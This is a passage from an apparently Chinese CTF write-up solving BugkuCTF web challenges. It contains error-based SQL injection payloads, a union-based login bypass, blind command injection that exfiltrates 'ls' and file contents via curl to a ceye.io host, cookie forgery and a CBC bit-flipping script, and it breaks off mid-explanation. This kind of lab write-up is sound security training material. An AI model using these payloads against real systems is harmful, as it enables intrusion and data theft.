<p>payload如下：<br><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 表名</span></span><br><span class="line">?id=<span class="number">1'</span> <span class="function">and <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="string">'~'</span>,(<span class="keyword">select</span> group_concat(table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="string">'~'</span>),<span class="number">3</span>) %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 字段名</span></span><br><span class="line">?id=<span class="number">1'</span> <span class="function">and <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="string">'~'</span>,(<span class="keyword">select</span> group_concat(column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema</span>=database() and table_name=<span class="string">'flag2'</span>),<span class="string">'~'</span>),<span class="number">3</span>) %<span class="number">23</span>  </span><br><span class="line"></span><br><span class="line"><span class="meta"># 字段值</span></span><br><span class="line">?id=<span class="number">1'</span> <span class="function">and <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="string">'~'</span>,(<span class="keyword">select</span> flag2 <span class="keyword">from</span> flag2</span>),'~'),3) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190406011345493.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="*PHP_encrypt_1(ISCCCTF)"></a>*PHP_encrypt_1(ISCCCTF)</h4><p>解密脚本：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import hashlib</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''用python重写后的加密方法</span></span><br><span class="line"><span class="string">def eccrypt(data):</span></span><br><span class="line"><span class="string">    key = hashlib.md5('ISCC').hexdigest()</span></span><br><span class="line"><span class="string">    # print 'key--&gt;', key</span></span><br><span class="line"><span class="string">    x = 0</span></span><br><span class="line"><span class="string">    char = ''</span></span><br><span class="line"><span class="string">    data_len = len(data)  # data的长度</span></span><br><span class="line"><span class="string">    key_len = len(key)  # key的长度</span></span><br><span class="line"><span class="string">    for i in range(data_len):</span></span><br><span class="line"><span class="string">        if x == key_len:</span></span><br><span class="line"><span class="string">            x = 0</span></span><br><span class="line"><span class="string">        char += key[x]</span></span><br><span class="line"><span class="string">        x += 1</span></span><br><span class="line"><span class="string">    # print 'char--&gt;', char</span></span><br><span class="line"><span class="string">    flag = ''</span></span><br><span class="line"><span class="string">    for i in range(data_len):</span></span><br><span class="line"><span class="string">        flag += chr((ord(data[i]))+(ord(char[i])) % 128)</span></span><br><span class="line"><span class="string">    # print 'flag--&gt;', flag</span></span><br><span class="line"><span class="string">    return base64.b64encode(flag)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detrcy</span><span class="params">(b64)</span>:</span></span><br><span class="line">    int_b64 = []</span><br><span class="line">    b64de = base64.b64decode(b64)</span><br><span class="line">    <span class="comment"># print 'b64de--&gt;', b64de</span></span><br><span class="line">    <span class="comment"># print 'len_b64de--&gt;', len(b64de)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b64de)):</span><br><span class="line">        int_b64.append(ord(b64de[i]))</span><br><span class="line">    <span class="comment"># print 'int_b64--&gt;',int_b64</span></span><br><span class="line">    <span class="comment"># print 'len_int_b64--&gt;', len(int_b64)</span></span><br><span class="line">    key = <span class="string">'729623334f0aa2784a1599fd374c120d729623'</span>  <span class="comment"># 知道data的长度后直接写出来</span></span><br><span class="line">    int_key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        int_key.append(ord(key[i]))</span><br><span class="line">    <span class="comment"># print 'int_key--&gt;', int_key</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(int_b64)):</span><br><span class="line">        flag += chr((int_b64[i]-int_key[i]+<span class="number">128</span>) % <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># str_b64 = eccrypt('XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')</span></span><br><span class="line">    <span class="comment"># print 'str_b64--&gt;', str_b64</span></span><br><span class="line">    str_b64 = <span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span></span><br><span class="line">    <span class="comment"># print 'str_b64--&gt;', str_b64</span></span><br><span class="line">    detrcy(str_b64)</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><p>（1）根据提示，访问<code>?hint=flag.php</code>页面，页面上显示了源码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>) </span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> type=<span class="string">"text/css"</span>&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class="container" align="center"&gt; </span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">&#125; </span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（2）代码审计，是一道反序列化的题，构造<code>Cookie：ISecer</code>的值等于<code>$key</code>的值，一开始看到最下面的代码，以为<code>$key=ISecer:www.isecer.com</code>，多次尝试无果。再仔细看，发现这个赋值语句是在上面的判断语句之后才执行的，所以判断的时候<code>$key</code>的值为空…<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190411124128475.png" alt="在这里插入图片描述"><br>执行上面代码，得到：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190411124238626.png" alt="在这里插入图片描述"><br>（3）传入构造的Cookie：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190411124454468.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h4><p>名字虽然叫sql注入，但这其实是<code>.DS_Store</code>泄露，利用工具ds_store_exp:<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190411124801885.png" alt="在这里插入图片描述"><br>打开flag页面，下载到文件flag:<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/2019041112491636.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h4><p>扫目录，发现<code>show.php</code>，访问得到<code>flag</code>….<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190411125102545.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h1><p>打开题目是一个登陆界面，但是没找到注册界面，应该是利用注入来登录，尝试了几个常见的payload无果，查看HTTP头部，发现tip:<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118100031233.png" alt="在这里插入图片描述"><br>Base64解码得到：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此我们可以构造payload如下：<br><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">username = admin' union select 1,md5(1)<span class="comment">#</span></span><br><span class="line">password = 1</span><br></pre></td></tr></table></figure></p>
<p>登录成功后进入一个进程监控系统：</p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118100339641.png" alt="在这里插入图片描述"></p>
<p>随意测试可以看出来应该是一个命令执行的地方，但是不会将你额外执行的命令进行回显，先用如下payload测试一下：<br><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="comment">;sleep 3</span></span><br></pre></td></tr></table></figure></p>
<p>发现会延时3秒，于是我们想办法进行无回显的RCE</p>
<p>可以利用请求外带的方式得到命令执行的结果，构造如下payload：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">;curl <span class="number">288</span>vqv.ceye.io/`ls<span class="string">|base64`</span></span><br></pre></td></tr></table></figure>
<p>可以收到<code>ls</code>命令base64后的结果：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118100925596.png" alt="在这里插入图片描述"><br>解码得到：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">css</span><br><span class="line">fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt</span><br><span class="line">index.php</span><br><span class="line">login.php</span><br></pre></td></tr></table></figure>
<p>再构造：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">;curl <span class="number">288</span>vqv.ceye.io/`cat ./fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt<span class="string">|base64`</span></span><br></pre></td></tr></table></figure>
<p>得到</p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118103120129.png" alt="在这里插入图片描述"><br>解码得到flag，或者直接访问<code>fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt</code>也行。</p>
<p><br></p>
<h1 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h1><p>进入页面后，发现需要花费money来修炼，但是我们并没有足够的钱。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118154932420.png" alt="在这里插入图片描述"></p>
<p>观察到url中有<code>/wulin.php?action=map</code>，尝试文件包含，会跳转到<code>?action=500</code>，如下：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118155154389.png" alt="在这里插入图片描述"><br>查看源代码，发现三个js文件：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118155231225.png" alt="在这里插入图片描述"><br>先看一下<code>script.js</code>，用<code>eval()</code>执行了一个函数，我们改成<code>console.log()</code>放控制台运行一下：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118155421767.png" alt="在这里插入图片描述"></p>
<p>格式化后如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">"="</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">';'</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i].trim();</span><br><span class="line">        <span class="keyword">if</span> (c.indexOf(name) == <span class="number">0</span>) <span class="keyword">return</span> c.substring(name.length, c.length)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_create</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> Base64();</span><br><span class="line">    <span class="keyword">var</span> result = base.decode(temp);</span><br><span class="line">    <span class="keyword">var</span> result3 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; result.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = result[i].charCodeAt();</span><br><span class="line">        num = num ^ i;</span><br><span class="line">        num = num - ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">        result3 += <span class="built_in">String</span>.fromCharCode(num)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ertqwe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp_name = <span class="string">"user"</span>;</span><br><span class="line">    <span class="keyword">var</span> temp = getCookie(temp_name);</span><br><span class="line">    temp = <span class="built_in">decodeURIComponent</span>(temp);</span><br><span class="line">    <span class="keyword">var</span> mingwen = decode_create(temp);</span><br><span class="line">    <span class="keyword">var</span> ca = mingwen.split(<span class="string">';'</span>);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">-1</span> &lt; ca[i].indexOf(<span class="string">"flag"</span>)) &#123;</span><br><span class="line">            key = ca[i + <span class="number">1</span>].split(<span class="string">":"</span>)[<span class="number">2</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    key = key.replace(<span class="string">'"'</span>, <span class="string">""</span>).replace(<span class="string">'"'</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;img id="attack-1" src="image/1-1.jpg"&gt;'</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"attack-1"</span>).src = <span class="string">"image/1-2.jpg"</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"attack-1"</span>).src = <span class="string">"image/1-3.jpg"</span></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"attack-1"</span>).src = <span class="string">"image/1-4.jpg"</span></span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"attack-1"</span>).src = <span class="string">"image/6.png"</span></span><br><span class="line">    &#125;, <span class="number">4000</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;"</span> + md5(key) + <span class="string">"&#125;"</span>)</span><br><span class="line">    &#125;, <span class="number">5000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出来是在cookie上动手脚了，先看一下cookie是什么：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118160341723.png" alt="在这里插入图片描述"><br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"human"</span><span class="selector-pseudo">:10</span>:&#123;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"xueliang"</span>;<span class="attribute">i</span>:<span class="number">629</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"neili"</span>;<span class="attribute">i</span>:<span class="number">845</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"lidao"</span>;<span class="attribute">i</span>:<span class="number">93</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"dingli"</span>;<span class="attribute">i</span>:<span class="number">73</span>;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"waigong"</span>;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"neigong"</span>;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"jingyan"</span>;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"yelian"</span>;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"money"</span>;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"flag"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"0"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>是php序列化串，并且可以看到moeny属性为0，所以这一题的思路应该就是修改序列化里的money的值到足够大，然后再逆向加密回cookie，从而获得足够的钱。</p>
<p>根据上面的<code>decode_create</code>函数写出对应的加密函数如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode_create</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = temp.charCodeAt(i);</span><br><span class="line">        num = num + ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">        num = num ^ i;</span><br><span class="line">        result += <span class="built_in">String</span>.fromCharCode(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> Base64();</span><br><span class="line">    <span class="keyword">var</span> result2 = base.encode(result);</span><br><span class="line">    <span class="keyword">return</span> result2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还有一个比较坑的点，他给的base64的加密和解密函数不是完全对应的：在加密时使用了<code>_utf8_encode(input)</code>，而在解密时却把<code>_utf8_decode(output)</code>注释掉了，所以我们加密时也需要把这个注释掉，然后可以在控制台直接覆盖掉原来的函数。</p>
<p>这样就可以来伪造cookie了：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118161812753.png" alt="在这里插入图片描述"><br>修改cookie并刷新，可以发现我们已经有足够的钱了：</p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118162029257.png" alt="在这里插入图片描述"><br>然后按要求练功即可得到flag：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191118162101955.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h1><p>扫描目录得到文件泄露：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191204092536636.png" alt="在这里插入图片描述"><br>用vim恢复.swp文件得到源码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ...html code...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>进行代码审计，可以看到要想获得flag需要以admin的身份登陆，但是又禁止了直接用admin登录，但是是通过获取cookie中的值来判断是否为admin，所以就需要利用cookie伪造登录。</p>
<p>这里把登录的用户名及其密码存入数组，序列化后进行AES-CBC模式的加密，其中iv和cipher以cookie储存，可以控制，导致存在攻击的可能，即利用CBC字节翻转攻击。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191204095106678.png" alt="在这里插入图片描述"><br>在CBC模式下，加密过程中前一块的密文会用来产生后一块的密文，解密过程中前一块的密文会用来产生下一块明文。</p>
<p>这样如上图所示，如果我们改变前一块密文的一个字节，当它被用来与下一块密文解密后的值进行异或时，就会影响原来的那一个字节，从而修改了解密后明文的一个字节。</p>
<p>在这一题中，我们可以先注册一个用户名为Admin的用户，得到如下序列化串:<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"username"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"Admin"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"password"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"Lethe"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后进行分组，根据iv可知16字节为一组：<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">2</span>:&#123;<span class="attribute">s</span>:<span class="number">8</span>:"userna</span><br><span class="line">me<span class="string">";s:5:"</span>Admin";</span><br><span class="line"><span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"password"</span>;<span class="selector-tag">s</span></span><br><span class="line"><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"Lethe"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们要做的就是利用CBC字节翻转攻击将这里的A修改为a，即第二块偏移量为9的位置，对应的我们需要修改第一块相同偏移位置的值，从而使异或后的值为A。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = unquote(<span class="string">'5xk%2Fxj9S6VwrA1440izsIdOT5JkK%2FyyM4%2BVy8dHSegZO6I5jBESTxFltBW9d7qxSacEzFhXDKvo7qSG85dzAPQ%3D%3D'</span>)</span><br><span class="line"></span><br><span class="line">cipher = b64decode(cipher).decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line"></span><br><span class="line">cipher = cipher[:<span class="number">9</span>] + chr(ord(cipher[<span class="number">9</span>]) ^ ord(<span class="string">'A'</span>) ^ ord(<span class="string">'a'</span>)) + cipher[<span class="number">10</span>:]</span><br><span class="line"></span><br><span class="line">print(quote(b64encode(cipher.encode(<span class="string">'latin-1'</span>)).decode()))</span><br></pre></td></tr></table></figure></p>
<p>将得到的值url编码一些修改为cipher的值得到：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191204104650473.png" alt="在这里插入图片描述"><br>这里还有一个问题，我们为了修改A，修改了第一块分组，这样反序列化就会失败，因此我们必须还得保证第一块分组不变，这可以通过修改iv来实现。</p>
